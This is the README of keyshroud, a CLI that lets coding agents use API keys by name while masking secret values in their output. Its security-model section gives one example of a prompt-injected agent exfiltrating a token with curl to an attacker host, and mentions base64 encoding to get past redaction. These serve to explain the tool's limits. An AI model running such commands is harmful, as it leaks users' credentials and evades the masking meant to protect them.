<div align="center">

<h1>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup-dark.svg">
    <img alt="keyshroud" src="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup.svg" height="88">
  </picture>
</h1>

**Your agents use the keys. They never see them.**

keyshroud lets Claude Code, Codex, Cursor, Cline, OpenCode, Gemini CLI, pi and omp run commands
that need API keys, while every secret value reaches the model only as `<redacted:NAME>`.

[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Node](https://img.shields.io/node/v/keyshroud.svg)](package.json)

[Quickstart](#quickstart) · [Where secrets live](#where-your-secrets-live) · [Supported agents](#supported-agents) · [Least privilege](#least-privilege) · [CLI](#cli-reference) · [Compare](#how-it-compares) · [Security model](#security-model) · [FAQ](#faq) · [Docs](#documentation) · [Website](https://keyshroud.dev)

[🇻🇳 Tiếng Việt](i18n/README.vi.md) · [🇨🇳 简体中文](i18n/README.zh-CN.md) · [🇯🇵 日本語](i18n/README.ja-JP.md)

</div>

<p align="center"><img src="assets/demo.gif" alt="Demo: on a new machine, keyshroud add stores a GitHub token in the local vault through a masked prompt, keyshroud run masks it in the command's output, and scan finds a copy leaked into a file" width="860"></p>

```console
$ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login'
deploying with <redacted:GH_TOKEN>
dinhkarate
```

The command got the real token. The transcript, and the model reading it, got
`<redacted:GH_TOKEN>`. (Masking is automatic when an agent runs the command;
`--mask` forces it in a human terminal.)

## Why keyshroud?

Coding agents need credentials to do real work: `gh`, `npm publish`, cloud CLIs, webhooks,
databases. The usual ways to hand them over all leak:

| What people do | What goes wrong |
|---|---|
| Paste the key into the chat | It is in the transcript, the provider's logs and every later context window |
| Keep it in `.env` | The agent `cat`s the file while debugging, or commits it |
| Use a vault MCP server | Most of them return the plaintext value straight to the model |
| Pay for a secrets manager | `op run` needs a 1Password subscription, and it masks only the commands you wrap |

keyshroud takes a different route: **the agent works with names, the command gets the value, and
whatever the command prints is masked before the model reads it.**

- **Names, not values.** Agents see `GH_TOKEN` and `keyshroud://GitHub token`, never the token.
- **Masked output.** A value that reaches stdout or stderr becomes `<redacted:GH_TOKEN>`, in a
  command you wrapped and, in Claude Code and pi, in the ones you did not.
- **Nothing to set up.** An encrypted vault file with its key in your OS keychain. No account, no server.
- **Your vault, if you have one.** Vaultwarden or Bitwarden for several machines; HashiCorp Vault,
  OpenBao, Infisical, 1Password, AWS, Google Cloud and Azure are read where they are, never written.
- **Free.** MIT-licensed, no telemetry.

## Quickstart

**Requirements:** Node.js ≥ 18.19. Nothing else.

```bash
npm install -g keyshroud

# 1. Store a secret: typed into a masked prompt, never echoed.
#    The first one creates the local vault.
keyshroud add --env GH_TOKEN --item "GitHub token"

# 2. Use it
keyshroud run -- gh auth status
keyshroud run -- claude          # start an agent with every wired secret available

# 3. Check everything
keyshroud doctor
```

```console
$ keyshroud add --env GH_TOKEN --item "GitHub token"
Paste secret for GH_TOKEN: ****************************************
keyshroud: created the local vault ~/.config/keyshroud/vault.json; its key is in the macOS keychain (keyshroud-vault-9f2c4e6a1b3d5f70), so programs running as you can open it without asking.
created item=GitHub token env=GH_TOKEN targets=~/.config/keyshroud/env.json verified=yes
```

- **An agent can start it.** Without a terminal, `add` opens a hidden-input dialog on your desktop:
  the agent runs the command, you paste the value. It never passes through the chat.
- **Already have a `.env`?** `keyshroud import` moves its secrets into the vault and writes a
  `.env.refs` of references you can commit.
- **Or let the agent do the setup.** Paste this into Claude Code, Codex, Cursor, OpenCode or pi:
  `Read https://keyshroud.dev/install.md and set up keyshroud for me.`

## What you get

**Keeping values out of the model**

| | |
|---|---|
| 🙈 **Masked output** | `keyshroud run` replaces every secret value in stdout and stderr with `<redacted:NAME>`, whatever the exit code, and never lets a value slip through split across two chunks. |
| 🪝 **Agent hooks** | The pi/omp hook masks every tool result. Claude Code's `PostToolUse` hook masks every successful one (Bash, Read, Grep, MCP…), and [`keyshroud claude-guard`](#the-guard-failed-commands-masked-too) masks what a Bash command prints as it is written, failed commands included. |
| 🔌 **MCP server** | For clients without a shell: `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`. No tool returns a value. |
| ⌨️ **Paste-to-create** | A new secret goes through a masked prompt in your terminal, a hidden-input dialog on the desktop when an agent starts `add`, or a masked popup in pi. Never through the chat. |
| 🔎 **`scan`** | Finds vault values that leaked into your working tree, before you commit them. |

**Where secrets live**

| | |
|---|---|
| 🔐 **Local vault** | An AES-256-GCM file whose key is in the macOS keychain, the Linux Secret Service or Windows DPAPI; a passphrase where there is none; Touch ID on a Mac if you want to be asked. |
| 💾 **Backup** | `keyshroud backup` copies the local vault into one file under a passphrase of its own; `keyshroud restore` brings it back on any machine and wires the names again. |
| 🔄 **Sync** | Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden, when the same secrets should reach several machines. |
| 🏢 **Team secret managers** | `vault://`, `infisical://`, `op://`, `awssecrets://`, `awsssm://`, `gcpsecrets://`, `azurekeyvault://`: read-only sources, injected and masked like any other secret. |

**Working with them**

| | |
|---|---|
| 🔗 **Committable references** | `GH_TOKEN=keyshroud://GitHub token` in a `.env.refs` file: names, not values, safe to commit. |
| 🎯 **Project scope** | A `.keyshroud.json` in a repo (`{ "only": ["STRIPE_*", "GH_TOKEN"] }`) narrows what `run`, `env` and the agents get there to the names that project needs. |
| 📄 **`inject`** | Renders `{{ keyshroud://… }}` templates into `0600` files for tools that cannot read env vars (`.npmrc`, kubeconfig). |
| 🧾 **Audit log** | `audit.jsonl` records which *names* were used, when, by which command. Never values. |
| ⚡ **Fast** | The local vault answers in milliseconds, offline. With Vaultwarden: one batched `bw list items` per session instead of one `bw get` (~3 s) per secret. |

## Use cases

**"Claude Code keeps reading my `.env`."** Run `keyshroud import` to move the values into the vault
and write a `.env.refs` with lines like `GH_TOKEN=keyshroud://myapp GH_TOKEN`, then start the agent
with `keyshroud run --env-file .env.refs -- claude`. The plugin's hooks mask anything that still
slips into a tool result.

**"A failed command printed my token into the transcript."** Turn on
[`keyshroud claude-guard`](#the-guard-failed-commands-masked-too): everything a Bash command prints
in Claude Code is masked as it is written, whether the command succeeds or fails.

**"My company keeps its secrets in HashiCorp Vault."** `keyshroud source add vault --addr https://vault.example.com`
once, then `DB_PASSWORD=vault://secret/myapp/db#password` in `.env.refs`. The agent sees the name;
the value is read from Vault and masked in the output. The same goes for
[OpenBao, Infisical, 1Password, AWS, Google Cloud and Azure](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure).

**"This repo should only get its own keys."** `keyshroud scope --only 'STRIPE_*,GH_TOKEN'` writes a
[`.keyshroud.json`](#least-privilege-a-projects-own-names): an agent working there is not handed the
tokens of your other projects.

**"I like `op run` but don't want 1Password."** `keyshroud run` is the same idea, references in and
masked output out, with the vault on your machine or on a server you host.

**"My agent needs to add a new key."** It runs `keyshroud add` or calls `secrets_request` (MCP), and
a hidden-input dialog pops up on your desktop; in pi it is `/secret`. You paste the value there.

## Where your secrets live

| | Good for | Needs |
|---|---|---|
| [**The local vault**](#the-local-vault) (default) | One machine, no setup | Nothing |
| [**Vaultwarden or Bitwarden**](#sync-across-machines-vaultwarden-or-bitwarden) | The same secrets on several machines | A Bitwarden account or your own Vaultwarden, and the `bw` CLI |
| [**Your team's secret manager**](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure) | Secrets your company already keeps somewhere | Your existing sign-in there |

They work side by side: a reference names its vault (`keyshroud://…`, `bw://…`, `vault://…`).

### The local vault

`~/.config/keyshroud/vault.json` holds every item, encrypted with AES-256-GCM under one random
256-bit key. Item names are encrypted too. Where the key lives depends on the machine:

| Machine | Key | Unlocking |
|---|---|---|
| macOS | login keychain | none |
| macOS, Touch ID (`KEYSHROUD_VAULT_KEY=secure-enclave`) | wrapped to a key in the Secure Enclave | Touch ID when a command needs a secret; a session lasts 30 minutes |
| Linux with a desktop keyring | Secret Service | none |
| Windows | DPAPI, bound to your Windows account | none |
| Docker, servers, SSH, Linux without systemd | derived from a passphrase (scrypt) | `keyshroud unlock`; a session lasts 30 minutes |

Nothing can recover a lost key or a forgotten passphrase, and `vault.json` copied to another machine
does not open there: use a backup. More in [docs/local-vault.md](docs/local-vault.md).

### Backup and restore

```bash
keyshroud backup                           # asks for a new passphrase, writes ./keyshroud-backup-<date>.json
keyshroud restore keyshroud-backup-….json  # what it would add; --yes does it
```

The backup is one file sealed under a passphrase you choose, not under this machine's key, so it
opens anywhere. `restore` prints a plan of names first, keeps an item that has another value here
unless you add `--replace`, and wires the variable names again: on a new machine,
`keyshroud restore FILE --yes` is the whole move. Both run in a terminal only.
[Details](docs/local-vault.md#backup-and-restore).

### Sync across machines: Vaultwarden or Bitwarden

```bash
npm install -g @bitwarden/cli
bw config server https://vault.example.com     # self-hosted Vaultwarden; skip for bitwarden.com
bw login
mkdir -p ~/.config/keyshroud && echo bw > ~/.config/keyshroud/backend   # new items go there
keyshroud unlock                                # 30 minutes; the master password is not stored
```

`run`, the hooks, the MCP server and everything else work the same, through the Bitwarden CLI. No
server yet? [examples/vaultwarden](examples/vaultwarden#readme) goes from an empty VPS to
`keyshroud doctor` with Docker Compose and Caddy. Sessions, unlocking without being asked, moving
back to the local vault, and a separate agent account are in
[docs/vaultwarden.md](docs/vaultwarden.md).

### Team secret managers: Vault, OpenBao, Infisical, 1Password, AWS, Google Cloud, Azure

A company usually has a secret manager already. keyshroud reads from it and never writes there:
a reference says which secret, and nothing is copied into keyshroud's vault.

```bash
keyshroud source add vault --addr https://vault.example.com    # reads with the token of `vault login`
keyshroud wire --env DB_PASSWORD --item 'vault://secret/myapp/db#password'
keyshroud run --only DB_PASSWORD -- ./migrate.sh
```

```dotenv
# .env.refs: safe to commit, names only
DB_PASSWORD=vault://secret/myapp/db#password
STRIPE_KEY=awssecrets://prod/stripe#api_key
SENTRY_DSN=op://Engineering/Sentry/dsn
```

| System | Reference | Signs in with |
|---|---|---|
| HashiCorp Vault, OpenBao (KV v1 and v2) | `vault://<mount>/<path>#<field>` | `source add vault`: the token of `vault login`, a token, or AppRole |
| Infisical (cloud or self-hosted) | `infisical://<project id>/<environment>/[<folder>/]<NAME>` | `source add infisical`: a machine identity |
| AWS Secrets Manager, SSM Parameter Store | `awssecrets://<name or ARN>[#<json key>]`, `awsssm://<parameter>` | your `aws` CLI |
| 1Password | `op://<vault>/<item>/<field>` | your `op` CLI |
| Google Cloud Secret Manager | `gcpsecrets://<project>/<secret>[#<json key>]` | your `gcloud` CLI |
| Azure Key Vault | `azurekeyvault://<vault name>/<secret>[#<json key>]` | your `az` CLI |

Read-only, HTTPS only, and a reference can never name a server, so a `.env.refs` in a cloned repo
cannot send your token somewhere else. Vault, OpenBao and Infisical are tested against real servers
in CI; the `op`, `gcloud` and `az` paths against stand-in CLIs. Every option and limit:
[docs/team-secret-managers.md](docs/team-secret-managers.md).

## Supported agents

| Agent | Install | What you get |
|---|---|---|
| **Claude Code** | [plugin](#claude-code) | SessionStart + PostToolUse redaction hooks, skill; [`claude-guard`](#the-guard-failed-commands-masked-too) masks failed commands too |
| **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | env hydration, `tool_result` redaction (failed calls too), `/secret` |
| **Codex, OpenCode, Gemini CLI, Cursor agent** | [`npx skills add dinhkarate/keyshroud`](#other-agents-with-a-shell) | skill + CLI with masked output |
| **Claude Desktop, chat-only clients** | [`mcpServers` JSON](#mcp-clients-without-a-shell) | MCP tools with masked output |
| **Any shell or CI** | `keyshroud run -- <cmd>` | env injection + masked output |

Agents with a shell use the CLI: it costs no tool schemas in the context, and `keyshroud run` masks
output whatever the exit code. The MCP server is for clients that cannot run commands.

### Claude Code

```bash
npm install -g keyshroud
```
```text
/plugin marketplace add dinhkarate/keyshroud
/plugin install keyshroud@keyshroud
```

- **SessionStart hook:** tells Claude which secret *names* exist. It never asks for a password.
- **PostToolUse hook:** rewrites any successful tool result that contains a secret value to
  `<redacted:NAME>`.
- **Skill:** teaches Claude to use names and references, and to run secret-using commands through
  `keyshroud run`.

Start Claude through keyshroud to give its Bash commands the secrets: `keyshroud run -- claude`.
A vault item can also be Claude Code's own API key (`keyshroud claude-setup --item "Anthropic API key"`).
[docs/claude-code.md](docs/claude-code.md) has the rest.

### The guard: failed commands masked too

```bash
keyshroud claude-guard          # on (macOS, Linux); takes effect in new Claude Code sessions
keyshroud claude-guard --off
```

Claude Code cannot rewrite the output of a command that fails, so the hook alone leaves those
unmasked. With the guard on, Claude Code starts its shell through keyshroud: each Bash command runs
in your real bash or zsh, and what it prints passes through a masking process on its way to Claude
Code. A value becomes `<redacted:NAME>` whether the command succeeds, fails or is interrupted, and
whether or not it was run through `keyshroud run`. If the masking process cannot be started, the
command is not run rather than run unmasked. It costs about 0.2 s per command.
[How it works and its limits](docs/claude-code.md#the-guard-failed-commands-masked-too).

### pi / omp

```bash
pi install npm:keyshroud
```

The extension puts wired secrets into the agent's environment before provider auth resolves, masks
every tool result (successful or failed) and the output of `!commands` you type, and adds `/secret`
(describe, confirm the name, masked paste). [Details](docs/agents.md#pi--omp).

### Other agents with a shell

Codex, OpenCode, Gemini CLI, Cursor's agent and anything else that can run commands: install the
CLI and the skill, which teaches the agent to run secret-using commands as `keyshroud run -- …` and
to store new secrets with `keyshroud add`.

```bash
npm install -g keyshroud
npx skills add dinhkarate/keyshroud
```

`npx skills` needs Node.js 22.20+; on an older Node, [copy the skill](docs/agents.md#other-agents-with-a-shell)
that comes with the CLI.

### MCP clients without a shell

Claude Desktop, chat-only clients, or an agent you do not allow to run commands:

```json
{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
```

`secrets_run` runs a command with secrets injected and returns its exit code and masked output;
`secrets_list`, `secrets_request` and `vault_status` round it out. None returns a value.
[Details](docs/agents.md#mcp-clients-without-a-shell).

## Least privilege

By default `keyshroud run` gives a command every wired secret. Three ways to narrow that:

- **Per command:** `keyshroud run --only GH_TOKEN -- gh pr list` injects that name alone, and removes
  the other wired names from what the command inherits. If that name cannot be resolved (a locked
  vault, a missing item), the command is not run.
- **Per project:** a scope file, below.
- **Per vault:** with Vaultwarden, `keyshroud setup` gives the agents an account of their own.

### Least privilege: a project's own names

```bash
cd ~/code/shop
keyshroud scope --only 'STRIPE_*,GH_TOKEN'   # writes ./.keyshroud.json
keyshroud scope                              # what is in scope here, and how many names are not
```

```json
{ "only": ["STRIPE_*", "GH_TOKEN"] }
```

In that directory and below it, `run`, `env`, `secrets_run`, pi's shell and the names Claude Code is
told at session start are narrowed to the names in scope, and a name outside it is refused. The file
holds names and patterns only, so it can be committed. Masking is not narrowed: a value outside the
scope that turns up in output is still masked. A file that cannot be read as a scope puts nothing in
scope instead of everything. It is a default against accidents, not a wall:
[docs/project-scope.md](docs/project-scope.md).

### Least privilege: a separate agent account

With Vaultwarden or Bitwarden, an unlocked session opens your whole vault. `keyshroud setup --email
you+agent@example.com` gives keyshroud its own `bw` login on a dedicated account that holds only
the secrets agents need, and `keyshroud migrate` copies the wired items there.
[docs/vaultwarden.md](docs/vaultwarden.md#least-privilege-a-separate-agent-account).

## CLI reference

```text
Store     keyshroud add --env NAME --item ITEM        store a new secret (masked prompt or dialog)
          keyshroud import [--yes]                    move a .env into the vault, write .env.refs
          keyshroud rotate --item ITEM                replace a value
          keyshroud wire | unwire | list | rm         manage names and items
Use       keyshroud run [--only A,B] [--env-file F] -- <cmd>
          keyshroud inject -i template -o out         render a template into a 0600 file
          keyshroud env                               the names available here
Check     keyshroud doctor | status | scan [paths] | redact < log.txt
Narrow    keyshroud scope [--only A,B_* | --clear]    this directory's .keyshroud.json
Vault     keyshroud unlock | lock | rekey | backup | restore FILE
Sources   keyshroud source [add vault|infisical … | rm …]
Agents    keyshroud mcp | claude-setup | claude-guard [--off] | link-cli
```

| Reference | Resolves to |
|---|---|
| `keyshroud://GitHub token` | the value stored in the local vault (`/notes` for its notes) |
| `bw://GitHub CLI token` | a Vaultwarden login's password (`/username`, `/notes`, `/totp`, `/fields/<name>`) |
| `vault://secret/myapp/db#password` | a field of a KV secret in HashiCorp Vault or OpenBao |
| `op://Engineering/Sentry/dsn` | what `op read` gives for it (1Password) |
| `awssecrets://prod/stripe#api_key` | a key of a JSON secret in AWS Secrets Manager |

**Exit codes:** `0` ok · `2` usage · `3` vault locked or unavailable · `4` secret missing or item
name ambiguous · `5` refusing to overwrite existing state. `run` exits with the child's code.

Every command, flag, reference form and environment variable: [docs/cli.md](docs/cli.md).

## How it works

```
              ┌──────────────────────────── your machine ─────────────────────────────┐
              │  vault.json ◄── key: keychain · Secret Service · DPAPI · passphrase   │
              │      │                                                                │
              │      ▼                                                                │
 Vaultwarden ◄┼─bw─ keyshroud ── resolves keyshroud:// and bw:// refs ──► command's env   │
 team vault  ◄┼──── (read-only)                                          │            │
              │      └──── redactor ◄──── stdout / stderr ◄──────────────┘            │
              │                │ <redacted:NAME>                                      │
              └────────────────┼──────────────────────────────────────────────────────┘
                               ▼
                  agent transcript / LLM provider
```

1. **Wiring.** A secret is wired by *name*: `GH_TOKEN → keyshroud://GitHub token`, in
   `~/.config/keyshroud/env.json` or a project's `.env.refs`. Only names and references are written.
2. **Resolve and inject.** When a command runs, values are read from the vault and put into the
   child process's environment. Never into argv, never into a tool result.
3. **Redact.** The command's output passes through a redactor that knows every value. The Claude
   Code hooks and the guard, which run outside that process, work from a keyed-HMAC fingerprint
   index instead, so they never hold plaintext.

The long version: [docs/how-it-works.md](docs/how-it-works.md).

## How it compares

Tools that give agents secrets fall into four approaches (as we read their docs on 2026-11-15;
corrections welcome in an issue):

| Approach | Examples | Does the model see the value? | A command you did not wrap | Covers |
|---|---|---|---|---|
| **Names in, masked output out** | **keyshroud** | No: tool output is masked | Masked too in Claude Code (hook, plus the guard for failed commands) and pi/omp; other agents rely on `keyshroud run` | Any secret a command reads from its environment or a file |
| A wrapper that masks its own child | 1Password `op run`, `dotenvx run --redact`, `varlock run`, `secretspec run` | Not from the wrapped command | Not masked | The same, for the commands you wrap |
| A vault MCP server | Bitwarden MCP, HashiCorp Vault MCP, Doppler MCP, Infisical MCP (by default) | Yes: the tool returns it | n/a | Looking a secret up |
| An egress proxy with placeholders | Infisical Agent Vault, OneCLI, `fnox proxy`, 1Password for NVIDIA OpenShell, Claude Code's `sandbox.credentials` mask | No: the agent holds a placeholder | n/a: the real value is never in the shell | HTTP(S) credentials for hosts you allow; needs a proxy that can read the requests |

keyshroud keeps the vault with you (a local file, your Vaultwarden, or the manager your team runs),
needs no account, and is free. An egress proxy is the stronger tool against a hostile or
prompt-injected agent, for the credentials it covers; keyshroud covers database passwords, SSH and
signing keys and every CLI that reads a variable. They combine. If you already pay for 1Password,
its `op run` and Environments are well made, and keyshroud reads `op://` references too.

## Security model

keyshroud protects against **accidental disclosure**: secrets ending up in transcripts, provider
logs, screenshots, commits or the model's context because a command printed them.

It does **not** make a hostile or prompt-injected agent safe. An agent that can run
`keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a value before printing
it, can exfiltrate it. If that is your threat model, use an egress proxy that swaps placeholder
credentials on the wire, restrict which secrets each session gets (`--only`, a scope), and keep a
human approving commands.

What to know before you rely on it:

- **The key is where your OS keeps keys.** In keychain mode any program running as you can open the
  local vault, agents included. Create it with a passphrase, or Touch ID on a Mac, to be asked.
- **Redaction is exact-match.** A partial or transformed value (`${TOKEN:0:10}`, base64) is not
  masked, and values shorter than 6 characters are never masked.
- **In Claude Code, a failed command is masked only with the guard on** or when it ran through
  `keyshroud run`.
- **Scopes and the guard are defaults, not walls.** A program running as you can change them.
- **Values never appear** in argv, logs, keyshroud's own diagnostics, MCP results, hook output or
  the audit log. That is tested.

Every guarantee we test for and every known limit: [docs/security.md](docs/security.md). Report
vulnerabilities privately, see [SECURITY.md](SECURITY.md).

## FAQ

**Do I need Vaultwarden?** No. Secrets live in an encrypted file on your machine by default.
Vaultwarden or Bitwarden is optional, for the same secrets on several machines.

**Do secrets leave my machine?** Not with the local vault. keyshroud has no backend of its own and
sends no telemetry; values go into the environment of the command you run.

**Can the agent still use the key?** Yes. The command gets the real value; only the text the model
reads is masked.

**Is this a sandbox?** No. It stops *accidental* disclosure. See the [security model](#security-model).

**Doesn't Claude Code do this itself?** Partly, and differently. Claude Code can deny reads of
files such as `.env`, and its sandbox can show a command a placeholder for a credential and put the
real value on requests to hosts you allow (`sandbox.credentials`, opt-in, sandboxed Bash only). It
has no secret store and does not rewrite what a tool prints. keyshroud is the store, works the same
across agents, and masks output; the two combine.

**Why not just `.gitignore` my `.env`?** That stops commits, not reads. Agents read `.env` to
debug, and whatever they read goes to the model provider.

**We use HashiCorp Vault (or AWS, 1Password, …) at work. Do I have to move the secrets?** No.
keyshroud reads them where they are and never writes there.

**How do I back up the local vault?** `keyshroud backup`. A plain copy of `vault.json` is not a
backup: it opens only with its key, which stays in this machine's key store.

**Does it work on Windows?** Yes, tested on Windows 10 with Node 22; the guard is macOS and Linux only.

More, including CI, Docker and upgrading from 0.7: [docs/faq.md](docs/faq.md).

## Documentation

The same pages, easier to read, are at [keyshroud.dev/docs](https://keyshroud.dev/docs/).

| | |
|---|---|
| [Move a project off `.env`](docs/migrate-from-dotenv.md) | Guide: `import`, `.env.refs`, deleting the plaintext, what teammates do |
| [CI and Docker](docs/ci-and-docker.md) | Guide: a passphrase vault in GitHub Actions, a Docker build and a container |
| [Rotate a key that leaked](docs/rotate-a-key.md) | Guide: find the copies, replace the value, what picks it up |
| [Troubleshooting](docs/troubleshooting.md) | Unresolved names, a locked vault, a value that printed unmasked |
| [The local vault](docs/local-vault.md) | Key modes, Touch ID, sessions, backup and restore |
| [Vaultwarden or Bitwarden](docs/vaultwarden.md) | Sync setup, sessions, a separate agent account, moving back to the local vault |
| [Team secret managers](docs/team-secret-managers.md) | Vault, OpenBao, Infisical, 1Password, AWS, Google Cloud, Azure |
| [Project scope](docs/project-scope.md) | `.keyshroud.json`: what it narrows and what it does not |
| [Claude Code](docs/claude-code.md) | The plugin's hooks, `claude-setup`, the guard |
| [pi, omp and other agents](docs/agents.md) | The pi/omp extension, the skill, the MCP server |
| [CLI reference](docs/cli.md) | Every command, reference form, exit code and environment variable |
| [How it works](docs/how-it-works.md) | Wiring, unlocking, resolving, injecting, redacting |
| [Security model](docs/security.md) | Guarantees we test for, and known limits |
| [FAQ](docs/faq.md) | Windows, upgrading, short answers |
| [Agent setup guide](https://keyshroud.dev/install.md) | Step-by-step install written for AI agents |

## Development

```bash
npm install
npm run check        # typecheck + tests (fake bw, no real vault) + build
# the sources against real servers in Docker (Vault, OpenBao, Infisical, an AWS emulator):
export $(sh test/live-servers.sh) && node --test test/live.test.ts; sh test/live-servers.sh down
node src/cli.ts doctor   # run from source (Node ≥ 22.18 strips types)
```

See [CONTRIBUTING.md](CONTRIBUTING.md). The runtime-neutral core is in `src/core.ts` (the local
vault's file format in `src/vault.ts`, the sources' protocols in `src/sources.ts`); agent
integrations live in `extensions/`, `src/mcp.ts` and `src/hooks.ts`.

## Credits

Inspired by [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password): its popup
UI and diagnostics shape are ported here (MIT). Masked output follows 1Password's `op run`. Not
affiliated with Anthropic, Bitwarden, Inc., the Vaultwarden project or any vendor named here;
"Bitwarden" is a trademark of Bitwarden, Inc.

## License

[MIT](LICENSE) © 2026 dinhkarate
